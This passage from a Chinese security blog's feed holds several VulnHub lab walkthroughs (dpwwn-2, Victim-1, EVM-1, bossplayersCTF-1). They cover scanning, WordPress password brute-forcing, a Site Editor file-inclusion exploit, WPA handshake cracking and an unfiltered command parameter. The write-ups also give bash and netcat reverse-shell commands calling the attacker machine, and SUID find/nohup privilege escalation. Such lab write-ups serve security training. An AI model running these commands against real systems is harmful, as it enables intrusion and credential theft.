href="https://blog.csdn.net/weixin_44283446/article/details/123630335">Shellshock漏洞复现</a>; 这个属于是命令执行了, 反弹shell那些就不再说了</p></li><li><p>Samba远程代码执行漏洞（CVE-2017-7494)</p><p><a href="https://blog.csdn.net/qq_18780551/article/details/137267217">利用Samba远程代码执行漏洞(CVE-2017-7494)获取shell</a></p></li><li><p>25端口DNS漏洞利用-区域攻击<a href="https://blog.csdn.net/Goodric/article/details/128290352"># DNS 区域传送漏洞（dns-zone-tranfer）学习</a>; 这个一般用于信息收集的, 就不搞了</p></li></ul><blockquote><p>据说还有DNS拒绝服务攻击</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> NFS挂载 </tag>
            
            <tag> PostgreSQL </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dpwwn-2</title>
      <link href="/article/dpwwn-2/"/>
      <url>/article/dpwwn-2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>dpwwn: 2</h1><hr><p>easyNo.9</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/dpwwn-2,343/">vulnhub靶场-dpwwn: 2</a></p><p>目标: Get the root shell and then obtain flag under /root</p><p>描述: Difficulty: Intermediate++ and fun.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>出现当前硬件版本不支持设备&quot;sata&quot;, 启动失败; <a href="https://www.cnblogs.com/yaodun55/p/16434468.html">不兼容设备解决办法</a></p><p>靶机的ip固定为10.10.10.10, 你需要自己配置网络环境</p><ul><li>kali: 10.10.10.128</li><li>target: 10.10.10.10</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 10.10.10.0/24</span><br><span class="line">nmap -A 10.10.10.10</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">443/tcp  open  https</span><br><span class="line">2049/tcp open  nfs</span><br></pre></td></tr></table></figure><p>访问网页</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome Mate : dpwwn-02 GOAL IS SIMPLE : OBTAIN: # shell like root@dpwwn-02:~# </span><br></pre></td></tr></table></figure><p>目录扫描, 发现存在wordpress</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.10.10.10</span><br><span class="line"></span><br><span class="line">[04:32:48] 200 -    5KB - /wordpress/</span><br><span class="line">[04:32:48] 200 -    1KB - /wordpress/wp-login.php</span><br></pre></td></tr></table></figure><p>用wpscan扫扫看看有没有东西</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 有用户admin</span></span><br><span class="line">wpscan --url http://10.10.10.10/wordpress -e u</span><br><span class="line"><span class="comment"># 尝试爆破, 但是跑了好久没跑出来, 于是放弃</span></span><br><span class="line">wpscan --url http://10.10.10.10/wordpress -U admin -P /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>再来试试rpc和nfs, 发现没有东西, 也是失败了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /home/dpwwn02 (everyone)</span></span><br><span class="line">showmount -e 10.10.10.10</span><br><span class="line"><span class="comment"># 挂载了但是没东西啊</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp/dpwwn2</span><br><span class="line"><span class="built_in">chmod</span> 777 dpwwn2</span><br><span class="line">mount -t nfs 10.10.10.10:/home/dpwwn02 /tmp/dpwwn2</span><br><span class="line"><span class="comment"># 取消挂载和强制取消</span></span><br><span class="line">umount /tmp/dpwwn2</span><br><span class="line">umount -f /tmp/dpwwn2</span><br></pre></td></tr></table></figure><p>尝试往里面写文件, 发现可以写, 但是不知道那边是否可以被创建</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108190658.png" alt="image.png"></p><p>那现在就只有一个80端口的wordpress可以整了, 没有其他东西了</p><p>结合之前尝试过的, 知道了用户admin, 但是爆破排除; 那就只能是插件有问题了</p><p>虽然详细扫描需要WPScan API Token, 但是知道有什么插件不需要, 扫描得到插件<code>site-editor</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://10.10.10.10/wordpress</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108180425.png" alt="image.png"></p><blockquote><p>不喜欢搜索就用<a href="https://blog.csdn.net/2201_75362610/article/details/135629192">这篇文章</a>, 可以直接获取是什么漏洞</p><p>示例图: <img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108181028.png" alt="image.png"></p></blockquote><p>搜索可以找到<a href="https://avd.aliyun.com/detail?id=AVD-2018-7422">WordPress插件Site Editor本地文件包含漏洞</a>, 即CVE-2018-7422</p><blockquote><p>百度搜索不如google一根, 高级搜索还没别人模糊搜索强, 别用百度</p></blockquote><p>利用方法就是向<code>http://&lt;host&gt;/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php</code>文件发送<code>ajax_path</code>参数读取任意文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108185458.png" alt="image.png"></p><p>有任意读取, 但是却没有其他信息让我们知道什么地方有什么东西; 想到前面的nfs挂载, 那我们就利用这个确认nfs的那一头是否会受影响(已经创建了1.txt)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/home/dpwwn02/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108190715.png" alt="image.png"></p><p>证明可以成功创建, 那么就可以反弹shell了</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>新建一个php文件然后用vim编辑:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.10.128/6666 0&gt;&amp;1&quot;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后开始监听对应端口, 尝试包含文件, 成功包含</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">nc -lvnp 6666</span><br><span class="line"><span class="comment"># url</span></span><br><span class="line">http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/home/dpwwn02/shell.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108191622.png" alt="image.png"></p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><p>现在我们要进行第二步, 拿到root下的flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux dpwwn-02 5.0.0-23-generic #24-Ubuntu SMP Mon Jul 29 15:36:44 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 5.0.0-23-generic, 太高了</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 查看权限, 无</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 查看特权文件, find有权限</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 看看计划任务, 发现权限还是www-data</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>find提权立刻结束, 然后找到<code>/root</code>目录下的flag文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108192237.png" alt="image.png"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><blockquote><p>不要在根目录下执行<code>find .</code>会卡非常久, 找个小的吧</p></blockquote><p>靶机为ubuntu系统, 是不允许使用nc的-e参数的, 所以不能直接利用find反弹shell:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 如果可能的话</span></span><br><span class="line">find . -<span class="built_in">exec</span> nc -lvnp 6666 -e /bin/sh \&#x27;;</span><br><span class="line"><span class="comment"># 原理为利用-exec参数执行命令(本身是root权限)</span></span><br><span class="line">find . -<span class="built_in">exec</span> <span class="built_in">cat</span> /etc /etc/shadow \;</span><br></pre></td></tr></table></figure><p>既然可以以root权限执行命令, 那就可以给<code>/bin/bash</code>赋权然后利用-p参数获取root</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> <span class="built_in">chmod</span> u+s /bin/bash \;</span><br><span class="line">bash -p</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108193458.png" alt="image.png"></p><blockquote><p>你问我为什么没有提权就是bash-5.0, 因为我之前在根目录执行了<code>find .</code>, 然后卡死了, 虽然执行完了但是得重新连接</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> NFS挂载 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> find提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Victim-1</title>
      <link href="/article/Victim-1/"/>
      <url>/article/Victim-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Victim: 1</h1><hr><p>easyNo.8</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/victim-1,469/">vulnhub靶场-Victim: 1</a></p><p>目标: Get the root flag.</p><p>提示: Enumeration is key and bruteforcing SSH will get you banned.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.20</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">9000/tcp open  cslistener</span><br></pre></td></tr></table></figure><p>可以访问的界面由80和9000, 进行目录扫描, 扫了一大堆也没几个有用的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.56.20 --exclude-status 403,301</span><br><span class="line">[02:44:43] 200 -    1KB - /htaccess.txt</span><br><span class="line">[02:44:44] 200 -    7KB - /LICENSE.txt</span><br><span class="line">[02:44:49] 200 -    2KB - /README.txt</span><br><span class="line">[02:44:50] 200 -  392B  - /robots.txt.dist</span><br><span class="line">[02:44:50] 200 -   33B  - /robots.txt</span><br><span class="line">[02:44:53] 200 -   31B  - /templates/index.html</span><br><span class="line"></span><br><span class="line">dirsearch -u http://192.168.56.20:9000 --exclude-status 403,404</span><br><span class="line">[03:13:24] 200 -    3KB - /.htaccess</span><br><span class="line">[03:14:26] 200 -    0B  - /index.php</span><br></pre></td></tr></table></figure><p>阅读<code>htaccess.txt</code>和<code>README.txt</code>, 得到这是一个Joomla CMS</p><p><code>/robots.txt.dist</code>里面的路由更是全军覆没, <code>/robots.txt</code>可以得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: h@ck3rz!</span><br></pre></td></tr></table></figure><p>这个看起来是给我们看的, 那肯定是哪里有问题, 我们漏了什么; 重新扫描端口, 果然, 漏了一个8999端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 0-65535 192.168.56.20</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">8999/tcp open  bctp</span><br><span class="line">9000/tcp open  cslistener</span><br></pre></td></tr></table></figure><p>访问8999端口, 发现是一个wordpress网站, 但是没有实际界面, 只能查看源码; 唯一只有<code>WPA-01.cap</code>比较可疑</p><p>该流量包协议为802.11(WLAN)</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250107170708.png" alt="image.png"></p><p>DLine代表的是D-Link公司生产的设备, 一搜就知道是WiFi/路由器; 5a:b6:62则是MAC地址的一部分</p><p>所以这个流量文件是路由器交互的包, 肯定能拿到连接到路由器的密码</p><p><a href="https://blog.csdn.net/achejq/article/details/7899006">aircrack-ng破解教程</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.<span class="built_in">cap</span>  </span><br><span class="line"><span class="comment"># 使用gzip -d rockyou.txt.gz进行解压</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250107172007.png" alt="image.png"></p><p>第一个数据包存在双方信息, 剩下的都是通讯信息; 我们现在获取的有效字符串只有刚才的密码, 肯定是不够的, 看看第一个数据包中还有什么</p><p>每个无线网络都有自己的 <strong>SSID</strong>, 意思是SSID是唯一的, 这个可能会用于用户名;</p><blockquote><p>注意直接爆破ssh会被封禁, 所以要尽可能地缩小范围</p></blockquote><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250107181813.png" alt="image.png"></p><p>现在, 可以能利用到的服务都使用过了, 尝试利用已有信息登录ssh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dlink : p4ssword</span><br></pre></td></tr></table></figure><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh dlink@192.168.56.20</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250107182214.png" alt="image.png"></p><p>成功登录</p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux victim01 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.15.0-96-generic, 太高了</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line"><span class="comment"># 查看权限, 发现是TryHarder!</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 查看特权文件, nohup</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><code>sudo -l</code>中首先那个文件不存在, 然后我们没有权限创建那个文件; 内核版本太高, payload不好找; 还是来看看有SUID权限的nohup提权吧</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p><a href="https://gtfobins.github.io/gtfobins/nohup/">nohup</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> /bin/sh -p -c <span class="string">&quot;sh -p &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>成功提权并拿到在root下的flag</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250107183202.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> nohup提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVM-1</title>
      <link href="/article/EVM-1/"/>
      <url>/article/EVM-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>EVM: 1</h1><hr><p>easyNo.7</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/evm-1,391/">vulnhub靶场-EVM: 1</a></p><p>目标: root</p><p>描述: This is super friendly box intended for Beginner’s</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.103</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap一扫, 嘿! 还挺多</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">53/tcp  open  domain</span><br><span class="line">80/tcp  open  http</span><br><span class="line">110/tcp open  pop3</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">143/tcp open  imap</span><br><span class="line">445/tcp open  microsoft-ds</span><br></pre></td></tr></table></figure><p>dirsearch目录扫描, 居然是wordpress</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[05:46:40] 200 -   22KB - /info.php                                </span><br><span class="line">[05:46:54] 500 -    0B  - /wp-config.php                           </span><br><span class="line">[05:46:55] 200 -    1KB - /wordpress/wp-login.php                  </span><br><span class="line">[05:46:55] 200 -    4KB - /wordpress/  </span><br></pre></td></tr></table></figure><p>从<code>/info.php</code>可以得到似乎开启了disable_functions选项</p><p>尝试爆破一些wordpress的常见用户密码, 无用, 试试之前用的wpscan</p><p>不需要WPScan API Token也能拿到一个用户: c0rrupt3d_brain; 然后同样不需要Token也能进行爆破</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.103/wordpress -e u</span><br><span class="line"><span class="comment"># c0rrupt3d_brain</span></span><br><span class="line">wpscan --url http://192.168.56.103/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt</span><br><span class="line"><span class="comment"># c0rrupt3d_brain : 24992499</span></span><br></pre></td></tr></table></figure><blockquote><p>利用<code>gzip -d rockyou.txt.gz</code>自行解压</p></blockquote><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106191222.png" alt="image.png"></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>可以用msf, 可以手动getshell</p><h3 id="手动"><a class="header-anchor" href="#手动">¶</a>手动</h3><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106195114.png" alt="image.png"></p><p>Update后访问下面这个url去getshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106195250.png" alt="image.png"></p><p>开了disable_functions么? 如开</p><h3 id="msf"><a class="header-anchor" href="#msf">¶</a>msf</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search wordpress</span><br><span class="line">use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class="line">set lhost 192.168.56.5</span><br><span class="line">set rhost 192.168.56.103</span><br><span class="line">set username c0rrupt3d_brain</span><br><span class="line">set password 24992499</span><br><span class="line">set targeturi /wordpress</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux ubuntu-extermely-vulnerable-m4ch1ine 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.4.0-87-generic</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line"><span class="comment"># 查看特权文件, 无</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>虽然是www-data, 但是却可以访问<code>/home</code>下的用户文件</p><p>到达<code>/home/root3r</code>, 太美丽了<code>.root_password_ssh.txt</code>, 直接cat就能拿到看起来像是密码的东西</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">willy26</span><br></pre></td></tr></table></figure><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>尝试切换用户/重新登录, 发现可以切换为root</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106201020.png" alt="image.png"></p><p>然后可以在<code>/root</code>目录下找到祝贺语</p><p>内核的版本比较眼熟, 虽然没有gcc, 但是也可以试一试; 然后就没救了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate linux/local/45010.c</span><br><span class="line">gcc 45010.c -o 45010p -pthread</span><br><span class="line"><span class="comment"># ./45010p: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34&#x27; not found (required by ./45010p)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bossplayersCTF-1</title>
      <link href="/article/bossplayersCTF-1/"/>
      <url>/article/bossplayersCTF-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>bossplayersCTF: 1</h1><hr><p>easyNo.6</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/bossplayersctf-1,375/">vulnhub靶场-bossplayersCTF: 1</a></p><p>目标: root</p><p>描述: Aimed at Beginner Security Professionals who want to get their feet wet into doing some CTF’s.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.19</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap进行主机发现和端口/服务扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -A 192.168.56.19</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>访问80端口, 发现是一些描述, <a href="http://xn--sudocuong-f38nv624cesahb2880a.com">说请你访问sudocuong.com</a>, 其实没有东西;</p><p>查看网页源码, 发现最下面有一行注释:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK</span><br></pre></td></tr></table></figure><p>这是连续三个base64, 解码得到<code>workinginprogress.php</code></p><p>目录扫描发现robots.txt, 里面是不知道谁的&quot;密码&quot;, 解码后看来是没用的东西</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg==</span><br><span class="line">解码: lol try harder bro</span><br></pre></td></tr></table></figure><p>访问<code>workinginprogress.php</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System Install:</span><br><span class="line">Linux Debian - [*]</span><br><span class="line">APACHE2 - [*]</span><br><span class="line">PHP - [*]</span><br><span class="line"></span><br><span class="line">Outstanding:</span><br><span class="line">Test ping command - [ ]</span><br><span class="line">Fix Privilege Escalation - [ ]</span><br><span class="line">Completed:</span><br><span class="line"></span><br><span class="line">Say Hi to Haley - [*]</span><br></pre></td></tr></table></figure><p>这里似乎是一个展示了安装和实现了什么的界面; 既然这个界面存在, 那肯定有存在的理由</p><p>一般能在php文件上使用的方法, 是RCE, 文件包含, 文件上传, 反序列化; 这里可能存在的只能是RCE和文件包含, 我们不知道传参名是什么?那就模糊测试(跑字典)</p><p><a href="https://github.com/SexyBeast233/SecDictionary">实战沉淀字典</a></p><p>利用bp的Intruder模块, 结合参数字典中的关键词字典进行爆破</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106163113.png" alt="image.png"></p><p>都测试一遍后发现是RCE, 参数为cmd, 没有过滤</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106172300.png" alt="image.png"></p><blockquote><p>虚拟机跑字典实在是太慢了, 我建议将网络配置成物理机可以访问的再去爆</p></blockquote><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>其实已经是了, 反弹出来罢了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kali</span><br><span class="line">nc -lvnp 6666</span><br><span class="line"></span><br><span class="line"># target</span><br><span class="line">?cmd=nc -e /bin/bash 192.168.56.5 6666</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106172621.png" alt="image.png"></p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux bossplayers 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.19.0-6-amd64</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line"><span class="comment"># 查看特权文件, find有特权, 那就利用find提权</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>执行命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106173538.png" alt="image.png"></p><p>flag在root下的root.txt中, 解码后为congratulations</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Y29uZ3JhdHVsYXRpb25zCg==</span><br><span class="line"><span class="comment"># congratulations</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> RCE </tag>
            
            <tag> find提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mhz_cxf-c1f</title>
      <link href="/article/mhz_cxf-c1f/"/>
      <url>/article/mhz_cxf-c1f/</url>
      
